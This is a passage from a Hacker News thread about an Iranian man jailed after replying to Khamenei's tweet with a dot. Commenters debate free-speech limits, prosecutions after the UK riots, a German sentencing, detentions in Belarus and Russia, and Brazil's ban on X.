1949) was bloodier than any conflict in the 20th Century except the 2 world wars, and Rwanda had a little internal conflict in 1994 that resulted in the death of 491,000–800,000 citizens (of the Tutsi ethnic group). Also since the 1980s, 350,000–1,000,000+ have been killed and 2,000,000–3,800,000 displaced by internal conflicts in Somalia. Also, Libya and Syria more recently. >Modern English monarchy history easily traces back to 1066 . . . It's selective to limit political violence to last Civil War. It is the recent centuries of the history of a country that is the most informative for predicting what will happen in the future. reply ywvcbk 12 hours agorootparent> both the UK since the end of the English Civil War (1646) Only if we exclude Ireland and the Scottish Highlands which were both part of the UK. Being on an island and mostly free from foreign threats (compared to countries continental Europe) helped though. Scandinavia for instance has also been similarly peaceful (if not more so) in the same period. reply mapt 17 hours agorootparentprevTwelve years later: https://en.wikipedia.org/wiki/Days_of_May > The BPU had made its reputation amid the spontaneous rioting that had accompanied the fall of the First Reform Bill in 1831, assembling 150,000 protesters at Newhall Hill in the largest political assembly the country had ever seen.[15] Its threat to reorganise itself along semi-military lines in November 1831 had led to suggestions that it was trying to usurp the civil authority, and made a deliberate, if implicit, threat of the possibility of armed revolt in the event of the formation of an anti-reform government. Ultimately led to https://en.wikipedia.org/wiki/Reform_Act_1832 which dramatically expanded the voting franchise. The French Revolution, and the almost total destruction of an aristocratic/noble/royal system, was the subtext of every bottom-up political movement in Europe in this era. reply ywvcbk 12 hours agorootparentprevOnly if we restrict it to England/Lowland-Scotland specifically and not the occupied territories in Ireland and the Scottish highlands. But even there it was in large part only the case because the Hanoverian regime was highly effective at suppressing any type of dissent in pretty brutal ways. > law-abiding part of the world. The existence of the ‘Bloody Code’ would imply otherwise. They functioned as a method of class suppression. reply LAC-Tech 17 hours agorootparentprevThe English civil war wasn't violent to you? even the glorious revolution was very violent by modern standards. not to mention the following jacobite \"rebellions\". reply hollerith 17 hours agorootparentYou mean the glorious revolution that is also called the Bloodless Revolution? reply defrost 16 hours agorootparentThe deposition of James II and VII (same person, different kingdoms) in November 1688 was a singular event that followed the wider 1639 to 1653 Wars of the Three Kingdoms, which included The English Civil War (a series of civil wars and political machinations from 1642 to 1651) A singular action with no bloodshed that followed a period in which bodies were stacked high, including over a hundred thousand non combat civilians. A singular action with no bloodshed that sparked a long series of bloody revolts that began in March 1689, with major outbreaks in 1715 and 1719, and culminated in the Jacobite rising of 1745. Yes - he did mention the day James was deposed, you ignored the rest of century that surrounded that day. reply hollerith 16 hours agorootparentMy point is the having already mentioned the English Civil War (which I concede was quite bloody) the comment I replied to goes on to mention the Glorious Revolution, which (even if we adopt your definition) is double counting. reply LAC-Tech 16 hours agorootparentprevIt was bloodless for the time but was still a foreign expeditionary force marching on London in the middle of the 9 years war. Considering us moderns clutch our Pearl's at an obese person getting a heart attack during an \"insurrection\" it's fair to say it was violent by today's standards. reply mapt 17 hours agorootparentprevNo. It hasn't. Liberals are just motivated to be forgetful and not to teach this part of history very well. As far as I can tell, people in the UK have the right to vote because of, variously: The Parliament setting the King straight on who would win in a fight * https://en.wikipedia.org/wiki/English_Civil_War * https://en.wikipedia.org/wiki/Trial_of_Charles_I The Parliament gradually setting the King straight on whose support he needs to enact foreign policy, and the King's failures strengthening opposition in Parliament over the course of * https://en.wikipedia.org/wiki/American_Revolution * https://en.wikipedia.org/wiki/War_of_the_First_Coalition * https://en.wikipedia.org/wiki/George_III An apocalyptic and thereafter omnipresent fear of the aristocracy losing their heads after the French Revolution, leading to cycles of tyrannical repression of the working class alternating with massive working class actions. https://en.wikipedia.org/wiki/Six_Acts https://en.wikipedia.org/wiki/Peterloo_Massacre https://en.wikipedia.org/wiki/French_Revolution Violence from radical working & middle class suffragists following this period * https://en.wikipedia.org/wiki/Days_of_May * https://en.wikipedia.org/wiki/Reform_Act_1832 The threat of violence from radical working class suffragists, tinged with the prospect of religious and Irish revolutionary violence * https://en.wikipedia.org/wiki/Reform_League#Hyde_Park_demons... * https://en.wikipedia.org/wiki/Reform_League#English_Civil_Wa... * https://en.wikipedia.org/wiki/Reform_Act_1867 Numerous peaceful and less peaceful actions over many years by women's suffragists, including a protracted terrorist bombing campaign * https://en.wikipedia.org/wiki/Women%27s_suffrage_in_the_Unit... You could go on, but I'm no expert on UK history. Social change in UK democracy seems to mostly demand angry disenfranchised masses, a very few sympathetic ears in the House of Lords, and a larger body of Parliament & middle class people who want to strike some kind of nonviolent compromise and maintain order even if giving up some power offends. The US is very similar in that this is the stuff we don't like to talk about. The fact that our military fought a brief, bloody war or two against mining unions before any labor rights were recognized was a single decontextualized paragraph in my history textbook at age 15, and was never mentioned again. reply chasil 19 hours agoparentprevYou might investigate the current standard in the U.S., developed by the supreme court, known as Imminent Lawless Action. https://en.m.wikipedia.org/wiki/Imminent_lawless_action This replaced the previous standard, Clear and Present Danger. https://en.m.wikipedia.org/wiki/Clear_and_present_danger reply christiangenco 17 hours agorootparentOh that was fascinating! Thank you for bringing those standards up—it seems like the US legal system landed in a similar place as my intuition. “Imminent Lawless Action” is where I’d also draw the line. reply ants_everywhere 18 hours agoparentprev> without neutering the ability for a society to come up with new ideas. The goal isn't always this instrumental one. There is also freedom of conscience, which (like the US freedom of religion) isn't about generating new ideas. But wrt to the goal of generating new ideas you also need to consider all ways of making it too expensive to access information. There's the 1984 approach of violently preventing the spread of information. Then there's the more Brave New World aligned approach of flooding all communication platforms with distracting nonsense and lies. The second strategy scales a lot better. A lot of people are stuck in a mindset where you can shut down a few printing presses and kill an idea. That's the old war. The new war is much harder and we mostly haven't even begun to be honest with ourselves about it, let alone found any good answers for what to do about it. reply AnimalMuppet 5 hours agorootparentReal change - grassroots change - largely comes from a large number of small-scale interactions. Much of it is face-to-face. If you want to actually change things (rather than just broadcast a message to the world and expect things to change), you have to do the long, slow, patient work of talking to people. reply 2OEH8eoCRo0 18 hours agorootparentprevThe new war makes it so you can post anything you want but the algorithm will make sure nobody ever sees it. They give you a megaphone but they also put you in digital Antarctica without a soul around. I think just as there is freedom of speech- there is freedom to hear. If I want to listen to someone's words I should not be prevented from hearing them. Why do we need platforms? We have the internet already but then we are still at the whims of a search engine. We want our cake and to eat it too. reply ants_everywhere 18 hours agorootparentI agree. But to answer your question > Why do we need platforms? I'm currently of the opinion that hierarchies are partially an informational thing. Nodes that summarize or aggregate information from other nodes are higher in some abstract hierarchy (e.g. perhaps they have higher in-degree). Those abstractions tend to become more concrete and those nodes become points of centralization or what you might call platforms. The platforms don't have to look like they do now (in fact I hope they don't), but I am currently skeptical of any perfectly flat communication system just on informational grounds. reply zephyrthenoble 19 hours agoparentprevAren't there plenty of examples of the kind of speech you talk about in your second paragraph already on Twitter? There are plenty of hot takes to pick from, with some being censored more or less based on the current owner. I'd also be interested to have some examples of the current set of ideas that you believe we are stuck with. It's an interesting phrase, and it begs to be enumerated. reply christiangenco 15 hours agorootparentIn my personal experience on X it seems like the platform has become way more tolerant of more types of speech from more diverse perspectives. I feel this change has been an improvement. I’m curious about accounts you’ve noticed get censored more. What I mean by the current set of ideas we’re stuck with is the total set of every mainstream idea we have about everything. There have been a few recent examples of ideas that used to be considered misinformation worthy of censorship that have since gotten unstuck and are now part of the new accepted set (ex: the idea that COVID might be a lab leak, Hunter Biden’s laptop, Ivermectin). Without free speech that lets extremists explore “unacceptable” fringe ideas our society gets to the actual truth much slower. reply philipov 19 hours agoparentprev> I don't see how we could possibly criminalize anything like that without neutering the ability for a society to come up with new ideas. But isn't that exactly the point of policies like this? They're intended to dissuade new ideas, such as ideas about who should be in charge of society. reply ceejayoz 19 hours agorootparentWith fairly rare exceptions, most folks are just quibbling over where to draw the lines. Some things - death threats, defrauding people - are clearly both speech and over the line, and letting them go unchecked also \"dissuades new ideas\". reply macintux 18 hours agorootparentEven death threats are not “over the line” for everyone. reply ceejayoz 18 hours agorootparentThey are those \"fairly rare exceptions\", yes. Like the folks who think the Second Amendment means you can own nukes, or the Libertarian Party folks who don't like drivers' licenses, they're pretty fringe. reply colmmacc 19 hours agoparentprevWhat do you think of a domineering bully who demeans, berates, and manipulates a vulnerable partner? It's not hard to find examples of relationships where over years a person preys on someone else's insecurities and tells them every day that they are worthless, that no-one else will take them, and responds with anger to every minor irritation, often unpredictably. Or they may gaslight them and leave someone with a less sure sense of reality, doubting and undermining themselves. To me, these kinds of injuries are worse than many kinds of physical violence. People who have been extracted from, and recover from, situations like this (as much as anyone can) often say they would have preferred to be beaten. And they don't mean this lightly. This is all \"just\" speech; the perpetuators and victims often agree that they \"never laid a finger on them\". But it hardly about beginning or preventing new ideas. In some countries, this kind of speech and pattern of abuse is criminal. But it's not universally so. Should it be? The way these countries frame it is that rights - like freedom of speech - are not absolutely, but must be balanced with the harm they may cause, and to assess things almost case by case with balancing tests. This seems to me a very workable system of law with good outcomes. reply christiangenco 15 hours agorootparentI think verbal abuse is terrible and should be prevented by the state, just not under the umbrella of limiting free speech. For me verbal abuse is in the same sort of category as rigging up a bomb to detonate when I've tweeted a keyword. The crime isn't really about the ideas being expressed (which I believe should be protected), the crimes just happen to involve speech. Where abusive speech gets tricky for me is when people feel that ideas being publicly expressed are harming them (ex: a twitter discussion perpetuating hateful stereotyoes of people like me). In my current position that sort of speech is some of the most important to protect because I don't like it. reply boomboomsubban 19 hours agoprevI'm not defending Iran over this, I fully expect his imprisonment to be for a reason I would consider bullshit, but this article doesn't present much evidence that the two events in the title have any connection. He tweeted a dot, at some point after was arrested. Technically the article never says the dot is related to the arrest, but it's certainly implied. reply parhamn 19 hours agoparent> Technically the article never says the dot is related to the arrest, but it's certainly implied. Given the last sentence of the article is \"The prosecutor’s office in Ardabil alleged that Shanbehzadeh had been in contact with Israeli intelligence officers and was arrested when trying to leave the country, according to Voice of America.\" it's not even implied. reply boomboomsubban 18 hours agorootparentIt seems implied. Anybody only reading the headline or not giving it a thorough enough reading would probably think the dot is relevant to the sentencing. Even carefully reading it, the dot takes up significantly more of the article than what Iran claim the charges were. reply parhamn 18 hours agorootparentSorry I misread, I meant that the article itself points to the fact that theres more to the charge than the \"dot\", the just, oddly, happen to mention it on the last line. reply _cs2017_ 18 hours agoparentprevDoes it mean that for getting high quality news, NPR has become just as garbage as an average media outlet? reply boomboomsubban 16 hours agorootparentI don't think their willingness to trumpet Voice of America is anything new, and I more wonder why Voice of America want to make this story about a dot tweet. reply feedforward 19 hours agoparentprevIn 2010 there was an international campaign of clemency for an Iranian woman who was going to get the death penalty. The campaign said she was imprisoned for adultery. She was in prison for adultery - and also murdering her husband, with her lover's help. This part was always left out of the news reports on this, at least initially. reply BrandoElFollito 1 hour agorootparentShe was accused of the murder and acquitted. The stoning to death penalty was for adultery. https://www.theguardian.com/world/2010/jul/02/iranian-woman-... reply throw10920 19 hours agoprevIt's worth pointing out that similar stuff (although not quite as egregious) is happening in Belarus, Brazil, and even the UK. reply eigenket 19 hours agoparentCould you point to something happening in the UK you think is similar to this? Edit: I guess there's this [1] which free-speach maximalists would probably disagree with. Personally I think there's a line between free speech and calls to violence at which point its reasonable to prosecute people. She tweeted calling for people to set fire to buildings where migrants were being housed. [1] https://www.bbc.com/news/articles/cx2910vrrygo reply ClumsyPilot 18 hours agorootparentWell we are working it. In these riots we have charged a 12 year old orphan, sentenced 13 year old girl, jailed a guy for being “a curious observer”, and some woman for throwing water. Previously, we have sentenced a teenager for reposting a rap song, some guy for filming his pug doing nazi salute, and charged two guys for possession of a book ‘Anarchist cookbook’ Also we have charged a woman for silent prayer. So now I understand why a book about ‘thoughtcrime’ was written in Britain, it’s a local idea that was in the air for some time reply throw10920 18 hours agorootparentThe UK judges have stated that they will jail passive observers of the riots as a matter of policy, so it's not just that one guy: https://www.telegraph.co.uk/news/2024/08/09/judge-refuses-ba... reply eigenket 11 hours agorootparentMore specifically they're jailing people who were at the riots but who claim they were only passive observers. This is standard pre-trial detention because pretty serious crimes were committed. Obviously if its found at their trial that they didn't commit any crime then they won't be going to prison. reply eigenket 10 hours agorootparentprevI don't know the details of the other cases but the UK didn't jail anyone for being a \"curious observer\". They jailed him in advance of his trial where it is alleged he took part in criminal acts (setting fire to shops and other standard riot stuff). He claims he was a curious observer, but frankly he can claim whatever he likes. Like everyone in pre-trial detention he is innocent until proven guilty so his claim doesn't really change anything. reply throw10920 19 hours agorootparentprevnext [12 more] [flagged] eigenket 19 hours agorootparentAre you lying or misinformed? He didn't get 3 years in prison for telling people to go out and protest, he told people to “set fire to all the fucking hotels full of the bastards”. Setting fire to a building full of people isn't a protest, it's attempted murder. https://www.independent.co.uk/news/uk/crime/northampton-bbc-... reply emmet 18 hours agorootparentThey always try to be vague when the truth is difficult to defend. reply throw10920 18 hours agorootparentYou both are actively lying. I'm not talking about Tyler Kay, I'm talking about Wayne O’Rourke, whose tweets did not advocate for murder at all, let alone “set fire to all the fucking hotels full of the bastards”. Not once did I mention Tyler. That's something you fabricated to deceive and mislead. It's people like you that enable authoritarianism around the world by gaslighting others and justifying suppression of speech. reply eigenket 12 hours agorootparentOh, that guy posted \"Today was a terror attack by a Muslim...heads must roll\" which again sounds like a call to violence to me. Sorry I picked the wrong guy calling for racial violence, my mistake. reply nec4b 26 minutes agorootparentI'm curious, what do you think \"heads must roll\" means? Is English your first language? reply throw10920 6 hours agorootparentprevYou actively lied about the person that was jailed to further a political agenda of suppressing free speech, protest, and democracy. That's not a mistake, that's malice. Your bad indeed. Moreover, it's pretty clear that \"heads must roll\" is a euphemism used for people being punished or losing their job, and is almost always used in a non-violent context: https://www.merriam-webster.com/dictionary/heads%20will%20ro... There's no clear call to violence here. You are actively trying to justify tyranny. reply eigenket 5 hours agorootparentI didn't lie, I got the wrong guy because you weren't specific. In the context of his tweet I think it was clearly a call to violence. Almost always is not the same as always. reply throw10920 5 hours agorootparent> I got the wrong guy because you weren't specific That doesn't make it any less of a lie - you said something factually false about the person I was referring to. You also made an assumption that you knew could be false in order to push a political agenda and deceive others. > Almost always is not the same as always. This is grasping for straws, and has the tyrannical premise of \"guilty until proven innocent\" behind it. I really hope that you're not in a position of power in my country, or any one for that matter. reply eigenket 4 hours agorootparent> and has the tyrannical premise of \"guilty until proven innocent\" behind it No it doesn't, for three reasons. 1. This is an internet forum not a court of law 2. He already plead guilty to his crime and been convicted, hes no longer in the \"innocent until proven guilty\" phase 3. Calling for violence wasn't even the crime he was convicted of. That was \"publishing written material to stir up racial hate\" [1]. Now you can reasonably say (and I expect you would) that you don't think that publishing written material to stir up racial hate should be a crime. Personally I think it should, because stirring up racial hatred is pretty damaging. [1] https://www.legislation.gov.uk/ukpga/1986/64/part/III/crossh... reply AnimalMuppet 4 hours agorootparentprevDude, cool your jets. The site guidelines call for you to assume good faith; you are failing at that. While you're at it, look up the definition of \"lie\". It doesn't mean \"made a mistake out of confusion\". reply AlexSW 18 hours agorootparentprevCould you link to the particular case you're referring to? reply snehk 12 hours agoparentprevAdd Germany to that list. A girl was sentenced to actual jail for insulting a rapist who was spared jail. Absolute madness. reply eigenket 10 hours agorootparentOk, there's some stuff that you seem confused about here. Firstly she wasn't sentenced for insulting him, she was sentenced for threats of violence against him, specifically she wrote something like \"you won't be able to go anywhere without having your face kicked in\" and leaked his personal information. Secondly she was in jail for 2 days, this was Freizeitarrest which is legally distinct from an actual prison sentence, with the aim of showing someone how unpleasant prison can be. You're not in a normal cell, don't have contact with regular prisoners, it doesn't leave a police record, doesn't have the same probation or anything. Finally he wasn't sentenced to jail because he was a minor. He did get sentenced to 60 hours of labor with the proceeds going to her. I don't know whether 60 hours of unpaid (presumably) unpleasant labor is harsher than the very short \"jail\" sentence she got, personally I would say so but it probably depends on the person. Personally I would agree that his sentence wasn't harsh enough, but German law doesn't really like giving minors harsh sentences. I think her punishment for the threats of violence were completely reasonable. reply throw10920 5 hours agorootparentnext [5 more] [flagged] eigenket 5 hours agorootparent> She was not jailed solely for the threats of violence. As far as I understand, yeah she was. I'm not an expert in the German legal system but while the defamation was also a crime my understanding is she wouldn't have been sent to jail for that. As far as the rest of your comment goes, I already said in the comment you're replying to that in my opinion the sentence he was given was significantly too light. Thats a specific weird thing about the German legal system, they are (in my opinion) very light on people who are being tried as juveniles. > You also missed the part about the fact that she got a harsher sentence for her speech than the rapist himself I literally mentioned that in the comment you're replying too and as I've now said three times, in my opinion his sentence was not harsh enough. I haven't lied anywhere on this thread. reply throw10920 5 hours agorootparent> my understanding is she wouldn't have been sent to jail for that. Your \"understanding\" directly contradicts the links I posted saying that she was jailed for her insulting/offensive remarks. > I haven't lied anywhere on this thread. > He didn't get 3 years in prison for telling people to go out and protest, he told people to “set fire to all the fucking hotels full of the bastards”. That's a lie, right there. I was not referring to that person. https://news.ycombinator.com/item?id=41429818 reply eigenket 5 hours agorootparentCopying and pasting from literally the third sentence of the link you posted > The young woman was convicted last week of sending \"insulting and threatening\" messages The threatening is important I didn't lie in the comment you linked, I just didn't magically guess which guy you were talking about. I apologise for that. reply throw10920 4 hours agorootparentnext [2 more] [flagged] eigenket 4 hours agorootparent>> my understanding is she wouldn't have been sent to jail for that. > Your \"understanding\" directly contradicts the links I posted saying that she was jailed for her insulting/offensive remarks. My copy and paste of the third sentence of your link was to point out that this is false. As far as the lying goes, if I was trying to lie I wouldn't have linked an article naming the guy in my message. What I said was completely correct about a guy who matches the description you gave as much as the person you intended did (both told people to protest, both called for violence against migrants (in my opinion)). I made a mistake in that I didn't know there was a second one of these scumbags in the news currently. That mistake is on me but its not a lie. reply GrassTheBikes 11 hours agorootparentprevUrsula Haverbeck always merits a mention too. Imagine people imprisoning a 90 year old woman for refusing to adopt their imposed narrative of a historical period in which she actively lived and participated. reply tasuki 2 hours agorootparent> in which she actively lived and participated. Yes... ? She participated... on the side of the Nazis who murdered Jews? She even threatened Jews with \"a new pogrom\"? I'd imprison her all right! reply 34679 18 hours agoprevVoice of America is a US government propaganda outlet that was barred from broadcasting directly to US citizens until the Smith-Mundt Act was amended in 2013. VoA is the primary source for this article. reply mmmBacon 18 hours agoparentSeems like you are trying to discredit the source as a way to get people to question the facts. The facts are that this story has been widely reported. It’s well documented that the Iranian government persecutes and foments violence against authors critical to their regime. reply 34679 1 hour agorootparentOr maybe I'm just not a fan of war propaganda? I don't care if you question the facts or not. I want you to question the motives. reply nec4b 39 minutes agoprevI worry we will soon read about similar things happening in Brazil. reply thimabi 20 hours agoprevWhat is the message that the dot tried to convey? reply sn_master 19 hours agoparentI believe he was trying to ratio him (and he succeeded). reply ceejayoz 19 hours agoparentprevProbably similar to https://en.wikipedia.org/wiki/Blank_piece_of_paper. reply fsckboy 19 hours agoparentprevyour bully replies to your tweet with a single period. you don't know precisely what he means, but you do know he's bullying you. You and your bully are adversaries, he's adversarying you. I'm not saying that Shanbehzadeh is the bully, I'm sure it's vice versa, but if you respond to your bully's post with a single period, prepare to get your ass kicked in school the next day. it might be fun to play the legal game \"but what law did I break\" in a country with rights and rule of law, but in a country without it...? I'm pretty sure Shanbehzadeh knew what he was risking. reply brendoelfrendo 19 hours agoparentprevThe dot got more \"likes\" than Khamenei's Tweet. He was able to \"ratio\" the supreme leader's message without saying anything at all, and apparently the government decided that's worth 12 years in prison. reply Alifatisk 8 hours agorootparentBut was that really the case? Reading the other comments seem to imply that the article had a baity headline reply brendoelfrendo 5 hours agorootparentWe should probably read the article rather than the other comments. The article does mention that, while the accused's family is unsure of the exact motive, the arrest happened shortly after the \"dot\" post. Perhaps it was just the most visible form of dissent that they committed just prior to arrest. reply smegsicle 19 hours agoparentprevtrying to overwrite the hardlink to current directory, typical cybercrime reply m3kw9 18 hours agoprevGot 12 years for a ratio reply hippich 20 hours agoprevLook up what for people in Belarus are being locked up daily since 2020. Emojis, likes, simply caught with preview of the news cached on their phone... We call border crossing, either on land or thought airport, a \"Belarusian roulette\", because your never know... And it is not prominent people, just regular folks. And it is not in completely different culture - it is a very close to western traditions country, right across Poland's border... reply avodonosov 14 hours agoparent> Look up what for people in Belarus are being locked up daily .... simply caught with preview of the news cached on their phone I live in Belarus, haven't heard of anyone locked for news cached on their phone. Could you provide sources of that info? I read all kinds of news, what if I am in danger... reply hippich 10 hours agorootparentI can't find it easily now, but it was Zerkalo reporting on yet another person returning to Belarus caught at the Poland border. The conclusion was that despite not being subscribed to one of the \"terrorists channel\" (for readers not from Belarus - news channels, that are posting news not in favor of the state), mere opening such channel will cache images from such channel locally. When authorities grab the phone, they make full dump of it and look for illegal stuff. And mere possession of such image is enough to get locked up. Proposed solution was - disable all media caching in Telegram. reply avodonosov 4 hours agorootparentIf you find the source in the coming days, while the HN thread is not yet blocked for posting - please share. I'd like to be aware of facts like this. Question. If you read Belarusian news, have you noticed that tut.by, being a quite decent, balanced news site in, say, 2013, 2014, in last years of its existence, maybe 2018, 2019, 2020 was quickly degrading, somewhere towards the Radio of the Thousand Hills? Deliberately falsifying the picture of reality for its readers? (Personally, by the beginning of 2020, long before the election, I had a text in mind, called \"Осторожно, tut.by\". Just didn't have time to write it up and publish.) reply hippich 17 minutes agorootparentquick search failed me at finding actual news article, here are recommendations for both Telegram and Viber regarding cached media files - https://news.zerkalo.io/life/69371.html reply hippich 44 minutes agorootparentprevI did not notice deliberate attempts like that, but in the vacuum created post 2020 there is not much left to be trusted besides zerkalo. They rely on sources they likely can not verify all the time, and as such they do make mistakes occasionally and post corrections - this indeed happens from time to time. If you have suggestions of better source of news - please share. reply arp242 19 hours agoparentprevI work on an organisation that does anti-corruption reporting. We have some software for that and the search box has \"Vladimir Putin, TeliaSonera\" as a placeholder example. Few months back a new hire quit on his second day when he saw that, because he was afraid he might get into trouble since he has to regularly travel to Russia (he was from, eh, somewhere in Eastern Europe or the Balkans or some such – I forgot). We had some discussions about whether that was completely paranoid and stupid, or whether it was somewhat reasonable/understandable. I was firmly in the last camp. Yes, maybe the chance of actually suffering consequences is small and in that sense it's paranoid, but people buy lottery tickets with a lower chance of winning. The arbitrariness of it is the point. reply 0cf8612b2e1e 19 hours agorootparentStifling thought crime does indeed seem best by punishing even trivial offenses. The gestapo cannot be everywhere, so encourage people to self censor or else. reply aguaviva 19 hours agorootparentprevUnfortunately his concerns are all too reasonable. Here's a recent case where Putin's people had a dual Russian-American citizen arrested while visiting her family, and then slapped with a 12-year jail term for the crime of donating $51 to a humanitarian charity (from within the US): https://www.usatoday.com/story/news/world/2024/08/15/us-russ... While small, the chance of getting caught up in these shenanigans is far higher than that of buying a winning lottery ticket. And the potential penalties much worse than could be alleviated by most any prize won in the lottery. (If they were from one of Russia's allies, such as Serbia or Hungary, they probably wouldn't have much to worry about. But if they're from a NATO country, then definitely so). reply riehwvfbk 18 hours agorootparent\"Humanitarian\" charity is not exactly a fitting description of the organization she donated to (though I agree that the sentence is out of proportion). To flip this around: imagine that someone was going through US customs and border clearance, and it became known that they donated money towards Russian FPV drones that hit Ukraine. Would you support giving this person a jail term or not? Now imagine that this person is a US citizen. Does that change your answer? reply aguaviva 17 hours agorootparentCan you provide us with any indications that the charity in question (Razom) channelled money towards actual military drones for Ukraine? We see they had a project in 2022 that did provide some drones, but this seems to have been in the context of supporting search and rescue operations and the like, not military operations. Razom maintains that it does not provide military supplies of any kind. Let alone \"weapons and ammunition\" per the FSB charges. Overall the charges seem to have as much credibility as the initial charge against her of \"swearing in a public place\". reply riehwvfbk 15 hours agorootparentHuh, they significantly sanitized their website following all the media attention. Now it does say it's all about medical supplies. However, one can't sanitize the entire Internet. Here's a page that mentions that Razom funds drones: https://dobro.ua/member/operator/bf-razom-dlia-ukrayiny/ But in any case, my question stands. Let's say a US citizen donated to a fund that supplied drones to Russia. Said drones do not carry a military payload, but can be used for recon and artillery targeting. What would you think about this person? reply aguaviva 13 hours agorootparentGood catch. It seems the U.S. organization did provide funds for military drones for Ukraine, at least for a certain time after 2016. Not that there's anything wrong with that, of course. Sounds like a perfectly wholesome thing to do, in fact, given the situation Ukraine has been facing since 2014. Whether it continued to do so by the time of her donation (in late 2023) -- being as Razom does seem to have shifted its emphasis in recent years (completely independent of any recent \"sanitizing\" of their website as you allege, but based on my own recollection of their messaging 2022-2023) -- is a different matter. That's all I have time for at the moment. I may comment further again in 1-2 days. reply Wytwwww 12 hours agorootparentprev> Would you support giving this person a jail term or not? Now imagine that this person is a US citizen. Does that change your answer How is that relevant? You're trying to equate someone's personal opinion to the Russian government putting someone in prison for 12-year due to $51? And that's far from the most egregious example. There are plenty of people in Russian prisons for much less than that (e.g. reciting poetry or ambiguous social media posts). Anyway regardless of anyone's personal opinion that's not how sanction enforcement or the US judicial system on the whole works. The U.S. Treasury Department has allowed transactions related to humanitarian causes (and a bunch of other cases) so what are you even talking about? reply netsharc 19 hours agorootparentprevShe's definitely unlucky that Putin was looking to replenish his supply of prisoners he can exchange for gun runners, etc, in Western prisons... reply quotz 19 hours agorootparentprevIf he was from the balkans his reason was definitely false and he just didnt wanna work at your place. We dont have that here, especially not for leaders not from our countries reply arp242 19 hours agorootparentLike I said, I don't recall exactly where he was from and can't be bothered to look it up, because it doesn't matter. But just because most people from location X don't have opinion Y, doesn't mean some don't. Either way, I certainly don't think he was making stuff up. He could have left at any time without any reason. We weren't holding him captive. reply forloni 20 hours agoprevnext [4 more] [flagged] api 19 hours agoparentIs the story false? reply brendoelfrendo 19 hours agoparentprev\"CIA front\" is a weird thing to say. It's openly funded by the US Government, so it's not like Radio Free Europe's affiliation is a secret or a conspiracy; we don't need to exaggerate for effect here. Anyway, his lawyer also spoke to a newspaper in Iran, so I think it's hard to argue that he was arrested and tried for something. Whether it was specifically for the dot thing is, I guess, the main thing that one could speculate on, if you were particularly distrustful of the sources. reply thomassmith65 19 hours agorootparentIt's true if we go back to 1949. It's hardly a bad thing though: RFE provided news from the outside world to those living under Soviet censorship. reply shafouzzz 20 hours agoprevnext [4 more] [flagged] feedforward 20 hours agoparentMaybe they'll do a report on the Free Liberty USA passing a law to put Tiktok censoring in their hands. reply washadjeffmad 18 hours agorootparentI wonder if people realize they've been conditioned into nationalists or if the technology facilitating propaganda is so effective that they don't recognize the rewards and punishments to the amplified talking points they encounter online for what they are. How often does anyone say, \"I support censoring China to protect big tech interests and out of fear of what they will learn using methods of data collection that we pioneered and use, but here is why I think that's necessary...\" in any discourse on TikTok? And why would they verbalize that when they can just do what worked on them - downvoting until you learn to adopt the right patterns or go away? reply Wytwwww 12 hours agorootparent> How often does anyone say, Indeed.. how often does anyone say that? Has anyone even said that? Or is that some distorted and dishonest interpretation of something someone might have actually said? reply LAC-Tech 18 hours agoprevI am sure Persia is not a great place to live. But I just cant trust sources like this to not twist and contort things. And I mean at the end of the day they murder a lot less children than other regimes in the area, so it's quantifiably less evil than some middle eastern countries. reply DataDive 20 hours agoprev [–] And if you dare to use Twitter in Brazil, you will be fined a year's salary. ... how authoritarianism shapes public discourse reply userbinator 19 hours agoparentVPN services are also officially banned in China (except for a small number of exceptions), but everyone who knows even the slightest about tech probably uses one. \"It's only illegal if you get caught.\" reply OKRainbowKid 20 hours agoparentprevSource? What are the fines for using a banned service in the US? reply mananaysiempre 20 hours agorootparentReuters, for example[1]: “[Supreme Court Justice Alexandre de] Moraes ordered that those who continued to access X via VPNs be fined up to 50,000 reais ($9,000) per day.” I don’t get how a thing like that could effecrively be ordered into law at a judge’s discretion, but evidently it was. [1] https://www.reuters.com/technology/lula-says-musk-must-respe... reply SR2Z 20 hours agorootparentprevThe only ways for a service to be banned in the US are by court order (i.e. judge says the site has to come down) which carries no penalties for visitors, and sanctions in which case visiting is generally still OK but paying the site is a no-no. In general, users never face fines in the US even for visiting \"banned\" pages. reply fsckboy 19 hours agorootparent>In general, users never face fines in the US even for visiting \"banned\" pages. You might be oversimplifying. Yes, the US does have particularly free speech, and especially for listening to it. But using kiddie porn sites, president threatening sites, ISIS recruiting sites, US govt leaked secrets sharing sites, perhaps ghost gun or bomb making sites, stalking ex girlfriends... I think a good bit of that has legal consequences for people under many circumstances. Evidence used to convict you is not much different than... evidence. reply Hizonner 19 hours agorootparentThe only one of those that's illegal just to visit in the US as far as I know is the child porn one, and even that only if you receive or attempt to receive actual child porn, as opposed to some other random content that might be on the site. Some of the things you list are actual criminal acts, not Web sites. Yes, if you stalk your ex, that's criminal, but simply visiting some Web site is not in itself illegal. If there is some US law that might purport to forbid just visiting a Web site, I've never heard of any attempt to enforce it. What the hell is a \"president threatening site\"? Threats to public officials as a service? reply fsckboy 16 hours agorootparentif you internet searched \"how do you dispose of a body\" and then a body is discoved having been disposed of, and you are suspected in the killing, that evidence is introduced at your trial, and a jury will be influenced by it, even though all you did was visit and read the site. That evidence will be even more damning if the page you visited described a particular method that was seen in the case in question. This would be very strong evidence in favor of your guilt. Same for all the other ones I mentioned. reply Hizonner 3 hours agorootparent... and yet it is not illegal to do that search. You will not be fined, imprisoned, or whatever, for doing the search. The fact that something can, in some circumstances, be evidence doesn't mean it's a crime, and the distinction is absolutely critical in the context we're dealing with here. reply ronsor 20 hours agorootparentprevThe US doesn't even block websites. Either the site is taken down (for everyone), or it's up. reply 0cf8612b2e1e 19 hours agorootparentprevCan you visit a Pro North Korea/ISIS/Iran website? You are kind of paying/circumventing sanctions with potential ad revenue. reply gruez 19 hours agorootparent>Can you visit a Pro North Korea/ISIS/Iran website? How about the website for Iran's supreme leader[1], with headlines like \"ZIONIST REGIME FACES SEVERE CONSEQUENCES FOR ITS ACTIONS\"? It's not blocked in the US. [1] https://www.leader.ir/en reply LAC-Tech 18 hours agorootparentThe only thing sensationalist about that headline is \"severe consequences\"- it is absolutely a Zionist regime though, not even a debatable point. reply ClumsyPilot 18 hours agorootparentprevIs that a relevant example? I though US government was separate from Israel’s , thought lately I am less sure! reply gruez 17 hours agorootparentHow is it not? The original question was asking for a \"a Pro [...] Iran website\". If the website of the Iranian government doesn't count as \"pro Iran\", I don't know what does. reply hluska 18 hours agorootparentprevIn this case, X is banned in Brazil. Brazil has an entirely different legal framework than the United States. reply feedforward 19 hours agorootparentprevIn 2006, a satellite repairman in New York City was 